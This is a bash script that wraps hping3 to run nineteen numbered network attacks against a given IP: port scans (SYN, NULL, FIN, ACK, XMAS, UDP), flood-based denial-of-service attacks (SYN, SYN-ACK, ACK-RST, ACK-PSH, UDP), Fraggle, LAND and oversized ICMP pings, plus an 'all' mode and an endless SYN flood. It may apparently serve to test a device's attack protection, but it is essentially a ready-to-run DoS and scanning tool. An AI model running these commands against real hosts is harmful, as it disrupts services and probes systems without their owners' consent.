#!/bin/bash
IP=172.20.10.4
type=0
max_num=19

usage() {
    clear
    echo "[I] Usage: [sh $0 num IP]"
    echo "num: Attack type. IP: Attack address,the default value is 192.168.225.1"
    echo "eg: [sh $0 1 192.168.1.100], Attack type is TCP_SYN_SCAN, attack address is 192.168.1.100"
    echo "eg: [sh $0 2], Attack type is TCP_NULL_SCAN, attack address is 192.168.225.1"
    echo '0  ALL attack'
    echo '1  TCP_SYN_SCAN'
	echo '2  TCP_NULL_SCAN'
	echo '3  TCP_FIN_SCAN'
	echo '4  TCP_ACK_SCAN'
	echo '5  TCP_FIN_RST_DOS'
	echo '6  TCP_ACK_FIN_DOS'
	echo '7  TCP_SYN_ACK_FLOOD'
	echo '8  TCP_ACK_RST_DOS'
	echo '9  TCP_ACK_PSH_FLOOD'
	echo '10 TCP_SYN_FLOOD'
	echo '11 TCP_XMAS_SCAN'
	echo '12 UDP_SRC_PORT_ZERO'
	echo '13 FRAGGLE_ATTACK'
    echo '14 UDP_PORT_FLOOD'
    echo '15 TCP_LAND_ATTACK'
    echo '16 ICMP_LARGE_PING'
    echo '17 TCP_SRC_PORT_ZERO'
    echo '18 TCP_FIN_SYN_DOS' 
    echo '19 UDP_PORT_SCAN'   
    echo '99 while 1 TCP_SYN_SCAN' 
}

automatic(){

    for i in $(seq 1 $max_num);do
         clear
         do_hping3 $i &
         sleep 20
         killall hping3
     done

}

do_hping3() {
    
    local  num=$1
    if [ "$type" -ne 0 ];then
        num=$type
    fi
    case $num in
        99)
            echo ' hping3 --flood -S $IP -p 80'
            hping3 --flood -S $IP -p 80
            ;;
        0)
            automatic
            ;;
        1)
            echo 'TCP_SYN_SCAN'
            hping3 -8 all -S $IP
            ;;
        2)
            echo 'TCP_NULL_SCAN'
            hping3 -8 all  $IP
            ;;
        3)
            echo 'TCP_FIN_SCAN'
            hping3 -8 all -F $IP
            ;;
        4)
            echo 'TCP_ACK_SCAN'
            hping3 --flood -8 all -A $IP
            ;;
        5)
            echo 'TCP_FIN_RST_DOS'
            hping3 --flood -F -R -p 5000 $IP
            ;;
        6)
            echo 'TCP_ACK_FIN_DOS'
            hping3 --flood -F -A -p 5000 $IP
            ;;
        7)
            echo 'TCP_SYN_ACK_FLOOD'
            hping3 --flood -S -A -p 5000 $IP
            ;;
        8)
            echo 'TCP_ACK_RST_DOS'
            hping3 --flood -R -A -p 5000 $IP
            ;;
        9)
            echo 'TCP_ACK_PSH_FLOOD'
            hping3 --flood -P -A -p 5000 $IP
            ;;
        10)
            echo 'TCP_SYN_FLOOD'
            hping3 --flood -S -p 5000 $IP
            ;;
        11)
            echo 'TCP_XMAS_SCAN'
            hping3 --flood -P -U -F -p ++ $IP
            ;;
        12)
            echo 'UDP_SRC_PORT_ZERO'
            hping3 --flood -2 -s 0 $IP 
            ;;
        13)
            echo 'FRAGGLE_ATTACK'
            hping3 --flood -2 $IP -s 1-1024 -p 7
            ;;
        14)
            echo 'UDP_PORT_FLOOD'
            hping3 --flood -2 $IP -s 1-1024 -p 7
            ;;
        15)
            echo 'TCP_LAND_ATTACK'
            hping3 --flood -S -a $IP $IP
            ;;
        16)
            echo 'ICMP_LARGE_PING'
            hping3 --flood --icmp -d 1800 $IP
            ;;
        17)
            echo 'TCP_SRC_PORT_ZERO'
            hping3 --faster -s 0 -p 5000 $IP
            ;;
        18)
            echo 'TCP_FIN_SYN_DOS'
            hping3 --flood -F -S -p 5000 $IP
            ;; 
        19)
            echo 'UDP_PORT_SCAN'
            hping3 --flood -2 -p ++  $IP
            ;; 
        *)
            usage
            ;;
    esac
}

if [ $# = 0 ]; then
    usage
else
    type=$1
    if [ $# = 2 ];then
        IP=$2
    fi
    do_hping3 0
fi

